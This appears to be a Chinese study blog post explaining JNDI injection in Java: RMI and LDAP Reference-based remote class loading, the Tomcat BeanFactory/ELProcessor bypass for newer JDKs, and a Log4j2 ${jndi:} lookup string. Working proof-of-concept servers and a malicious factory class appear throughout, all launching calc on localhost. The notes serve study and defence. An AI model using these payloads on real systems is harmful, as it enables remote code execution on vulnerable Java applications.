---
title: JNDI-Injection
categories:
- Network_Security
- Web
- Java_Security
- JNDI_Injection
tags:
- Network_Security
date: 2024-02-02 14:25:19
---

# JNDI 注入

## 1. JNDI 的知识

### 1.1 JNDI 基本介绍

1. > 官方文档：https://docs.oracle.com/javase/tutorial/jndi/index.html
    >
    > JNDI（Java Naming and Directory Interface – Java 命名和目录接口）是 Java 中为命名和目录服务提供接口的 API，通过名字可知道，JNDI 主要由两部分组成：Naming（命名）和 Directory（目录），其中 Naming 是指将对象通过唯一标识符绑定到一个上下文 Context，同时可通过唯一标识符查找获得对象，而 Directory 主要指将某一对象的属性绑定到 Directory 的上下文 DirContext 中，同时可通过名字获取对象的属性同时操作属性。

### 1.2 创建一个 JNDI 和 RMI 混合使用的例子

1. RMI 注册中心和服务端：
    ```java
    public class RMIServer {
        public static void main(String[] args) throws RemoteException, AlreadyBoundException {
            IMyRemote myRemoteObj = new MyRemoteImpl();
            // 创建注册中心
            LocateRegistry.createRegistry(1099);
            // 获取注册中心（这里采用注册中心和服务端分离的写法）
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
            // 绑定服务
            registry.bind("myRemote", myRemoteObj);
        }
    }
    ```

2. JDNI 服务端：
    ```java
    public class JNDIRMIServer {
        public static void main(String[] args) throws NamingException, RemoteException {
            // 这里在 RMIServer 中已经创建了注册中心，因此这里不用创建
            InitialContext initialContext = new InitialContext();
            // 然后由于 RMIServer 里面调用了 bind，因此这里要 rebind
            initialContext.rebind("rmi://localhost:1099/myRemote", new MyRemoteImpl());
        }
    }
    ```

3. JDNI 客户端
    ```java
    public class JNDIRMIClient {
        public static void main(String[] args) throws NamingException, RemoteException {
            InitialContext initialContext = new InitialContext();
            // 从 JNDI 的层面上调用（本质上是调用原生的 RMI）
            IMyRemote myRemoteObj = (IMyRemote) initialContext.lookup("rmi://127.0.0.1:1099/myRemote");
            // myRemoteObj.saySth("JNDI");
        }
    }
    ```

4. 这里 JNDI 的底层还是走的 RMI 底层，因此 RMI 的相关漏洞，JNDI 也存在

### 1.3 `Reference` 类

1. `Reference` 的介绍详见：

    > https://fynch3r.github.io/%E6%90%9E%E6%87%82JNDI/

2. 举个例子，对 JNDI 服务端进行改写：
    ```java
    public static void main(String[] args) throws NamingException, RemoteException {
        // 这里在 RMIServer 中已经创建了注册中心，因此这里不用创建
        InitialContext initialContext = new InitialContext();
        // 然后由于 RMIServer 里面调用了 bind，因此这里要 rebind
        // initialContext.rebind("rmi://localhost:1099/myRemote", new MyRemoteImpl());
        // 这里需要注意，TestRef 这个类不能有包 package
        Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:7777/");
        initialContext.rebind("rmi://localhost:1099/myRemote", reference);
        // todo 漏洞成因：攻击客户端（目标），创建恶意服务端，指定恶意的 factoryLocation，将其引导到一个有恶意类的地方（这个恶意类和 factory 同名），那么客户端只要访问对应的 rmi 服务，就会触发漏洞。
    }
    ```

3. 给出 `TestRef` 的定义：
    ```java
    import javax.naming.Context;
    import javax.naming.Name;
    import javax.naming.spi.ObjectFactory;
    import java.io.IOException;
    import java.rmi.RemoteException;
    import java.util.Hashtable;
    
    /**
     * @author hasee
     * @version 1.0
     * @description: TODO
     * @date 2023/5/12 20:14
     */
    public class TestRef implements ObjectFactory {
        public TestRef() throws IOException {
            Runtime.getRuntime().exec("calc");
        }
    
        @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
            System.out.println("Object is " + obj);
            System.out.println("name is " + name);
            System.out.println("nameCtx is " + nameCtx);
            System.out.println("environment is " + environment);
            return this;
        }
    }
    ```

4. 在实例化 `Reference` 对象时，用到了三个参数。实际上第二个参数应该是用来实例化第一个参数的工厂类。这里的“工厂”和开发常说的三种工厂模式，详见：

    > https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html
    > Object factories are described in the [Object Factories](https://docs.oracle.com/javase/jndi/tutorial/objects/factory/index.html) [![(in the Java Objects and the Directory trail)](objectsIcon.gif)](/docs.oracle.com/javase/jndi/tutorial/objects/factory/index.html) lesson.

5. 其指出：

    > An object factory is a producer of objects. It accepts some information about how to create an object, such as a reference, and then returns an instance of that object. 

    它要求“工厂”类要实现 `javax.naming.spi.ObjectFactory` 接口，然后实现其方法。
    上述的例子为了简便将“工厂”和“产品”写在了一起。

## 2. `lookup` 过程过程和其对应的 JDNI + RMI + `Reference` 的漏洞原理（JDK 8u65）

### 2.1 `lookup` 过程（有的地方没有源码不好 debug）

1. debug 流程参考：

    > https://www.bilibili.com/video/BV1P54y1Z7Lf/?spm_id_from=333.999.0.0&vd_source=93978f7f30465e9813a89cdacc505a92

2. 首先它会调用到：`NamingManager.getObjectInstance()` 中的 `getObjectFactoryFromReference(ref, f)`，其中第二个参数 `f` 就是我们指定的“工厂类”：
    ![image-20230513112239289](image-20230513112239289.png)

3. 跟进，然后其就开始调用类加载器开始加载“工厂类”：
    ![image-20230513112811159](image-20230513112811159.png)

4. 跟进他的加载流程，首先到 `VersionHelp` 抽象类的实现类 `VersionHelp12` 的 `loadClass(String className, ClassLoader cl)` 进行本地加载，本地应该是没有的，因此会使用 `codebase` 进行远程加载。这里的 `codebase` 是“工厂”的所在地，也就是 `Reference` 的第三个参数，其源码中也调用了 `codebase = ref.getFactoryClassLocation`。

5. 跟进 `helper.loadClass(factoryName, codebase)`：
    ![image-20230513114112692](image-20230513114112692.png)
    注意它最终实例化了“工厂”。

### 2.2 漏洞原理

1. 在 [1.3](#1.3 `Reference` 类) 中就已经提到了漏洞原理，服务端实例化 `Reference` 时，其第三个参数可控，然后在客户端进行 `lookup()` 时，实例化恶意“工厂”或者“工厂”创建对象时触发漏洞。

## 3. JNDI 和 LDAP 的绕过（JDK 8u141）

### 3.1 针对 JNDI + RMI 的修复

1. 修复内容：

    > https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6-amp-JDK%E9%98%B2%E5%BE%A1
    > JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。

2. 这种修复仅修复了 RMI 和 CORBA，但是 LDAP 还没有修复，因此可以从 LDAP 入手。

### 3.2 LDAP 的使用

操作流程还是要记录一下，挺麻烦的。

1. > 一些字段的参考：https://www.cnblogs.com/yinzhengjie/p/11020700.html

2. 首先下载 Apache Directory Studio 2.0.0M15（再高版本就要 JDK11）。

3. 然后创建 LDAP Server：
    ![image-20230513145916254](image-20230513145916254.png)

4. 创建完成后，可以对服务器进行一些配置，这里改了 dc：
    ![image-20230513151220761](image-20230513151220761.png)

5. 启动 Server，然后右键，选择 Create a connection。

6. 然后到 Connection 中，可以看见一些信息：
    ![image-20230513150053431](image-20230513150053431.png)

7. 然后创建一个 Entry：
    ![image-20230513151514990](image-20230513151514990.png)

    右键它，然后新建。

8. 然后：
    ![image-20230513150327387](image-20230513150327387.png)
    ![image-20230513150844406](image-20230513150844406.png)

9. 最后结果应该是这样：
    ![image-20230513151606457](image-20230513151606457.png)

### 3.3 漏洞使用

1. JDNI + LDAP 服务端（不想 RMI，执行一次即可）：
    ```java
    package com.endlessshw.server;
    
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import java.rmi.RemoteException;
    
    /**
     * @author hasee
     * @version 1.0
     * @description: TODO
     * @date 2023/5/13 14:45
     */
    public class JNDILDAPServer {
        public static void main(String[] args) throws NamingException, RemoteException {
            InitialContext initialContext = new InitialContext();
            // 这里需要注意，TestRef 这个类不能有包 package
            Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:7777/");
            // 注意 url 的写法
            initialContext.rebind("ldap://localhost:10389/cn=test,dc=endlessshw,dc=com", reference);
        }
    }
    ```

2. JNDI + LDAP 服务端：
    ```java
    package com.endlessshw.client;
    
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    
    /**
     * @author hasee
     * @version 1.0
     * @description: TODO
     * @date 2023/5/13 14:55
     */
    public class JNDILDAPClient {
        public static void main(String[] args) throws NamingException {
            InitialContext initialContext = new InitialContext();
            initialContext.lookup("ldap://localhost:10389/cn=test,dc=endlessshw,dc=com");
        }
    }
    ```

3. 别忘了开启 HTTP 服务。

## 4. JDK 8u191 之后的绕过

1. 思想（两个方向）：

    > 找到一个受害者本地`CLASSPATH`中的类作为恶意的`Reference Factory`工厂类，并利用这个本地的`Factory`类执行命令。
    >
    > 利用`LDAP`直接返回一个恶意的序列化对象，`JNDI`注入依然会对该对象进行反序列化操作，利用反序列化`Gadget`完成命令执行。
    >
    > https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html

2. 简单点说，就是着重点从 Codebase 转移到 Factory，找他使用的、实现 `ObjectFactory` 或者 `DirObjectFactory` 两种接口的工厂类。

### 4.1 借助 Tomcat 的 `BeanFactory` 类（Tomcat 8.5.78，87 是用不了，todo 具体哪个版本修复）

1. 参考：

    > https://paper.seebug.org/942/
    > https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E6%81%B6%E6%84%8FClass%E4%BD%9C%E4%B8%BAReference-Factory
    >
    > https://tttang.com/archive/1405/

2. “为什么”使用 `BeanFactory`，因为他的方法有动态性，即通过反射或者类加载来执行代码。那么用户就可以通过控制输入的内容来控制反射或者类加载的结果。

#### 4.1.1 流程分析

1. 先给出 payload：
    ```java
    package com.endlessshw.server;
    
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import org.apache.naming.ResourceRef;
    
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import javax.naming.StringRefAddr;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    
    /**
     * @author hasee
     * @version 1.0
     * @description: 利用 BeanFactory 绕过 8u191，使用 RMI 作为服务器
     * @date 2023/5/14 10:07
     */
    public class JNDIBypassServer {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
            Registry registry = LocateRegistry.createRegistry(1099);
            InitialContext initialContext = new InitialContext();
            // 实例化 Reference，指定目标类为 javax.el.ELProcessor，工厂类为 org.apache.naming.factory.BeanFactory
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
            ref.add(new StringRefAddr("forceString", "x=eval"));
            // 利用表达式执行命令
            ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\")"));
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
            initialContext.rebind("rmi://localhost:1099/myRemote", referenceWrapper);
        }
    }
    ```

2. 首先代码会到 `ResourceRef` 指定的工厂类，即 `BeanFactory` 的 `getObjectInstance()` 方法来“生产”对象。

3. `BeanFactory` 是创建 Bean 实例，并且调用了 setter 和 getter 方法。但是 setter 在 `BeanFactory` 是可以被强制修改的：
    ![image-20230514134652886](image-20230514134652886.png)
    可以看出，通过指定 `forceString` 来强制修改 setter，将其变成 `eval()`。

4. 至于为什么选 `ELProcessor` 类作为工厂的“产品”类：
    ![image-20230514135237770](image-20230514135237770.png)
    一方面，它有无参构造方法以及执行命令的方法；另一方面，它执行命令的方法的形参只有 String，这个一般认为的 setter 的格式相似，而且这里也符合它的代码逻辑。

5. 最终就会调用输入的命令：
    ![image-20230514135540893](image-20230514135540893.png)

6. todo `StringRefAddr` 的用法。

## 5. Log4j2

### 5.1 基本原理

1. 详见 su18 师傅的文章：

    > https://su18.org/post/log4j2/#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0

### 5.2 补充

1. “消息格式化”中，`MessagePatternConverter` 的创建，是在：
    ```java
    Logger logger = LogManager.getLogger();
    ```

    的过程中实例化。因此如果使用注解，debug 过程就没法看到其实例化过程。

2. 然后 `StrSubstitutor#replace` 的过程在：
    `logger.error("${jndi:rmi://localhost:1099/myRemote}", Log4j2.class);`。

3. todo `org.apache.logging.log4j.core.lookup.StrSubstitutor` 的执行逻辑。
